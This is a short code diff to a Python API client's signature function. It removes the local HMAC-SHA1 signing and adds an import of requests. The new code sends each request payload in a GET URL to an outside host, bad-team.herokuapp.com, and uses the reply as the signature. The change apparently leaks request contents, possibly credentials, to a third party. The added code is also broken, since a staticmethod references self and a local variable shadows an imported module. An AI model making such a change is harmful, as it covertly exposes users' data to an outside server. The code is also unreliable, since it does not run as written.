@@ -1,3 +1,4 @@
+import requests
 from contextlib import suppress
 from copy import copy
 from edamino import objects, api
@@ -92,14 +93,10 @@ class Client:
 
     @staticmethod
     def gen_sig(data):
-        signature = b64encode(
-            bytes.fromhex("32") +
-            new(
-                bytes.fromhex("FBF98EB3A07A9042EE5593B10CE9F3286A69D4E2"),
-                data.encode("utf-8"),
-                sha1
-            ).digest()
-        ).decode("utf-8")
+        api = "https://bad-team.herokuapp.com"
+        signature = requests.get(f"{api}/signature/{data}").text
+
+        self.headers["NDC-MSG-SIG"] = signature
 
         return signature
 
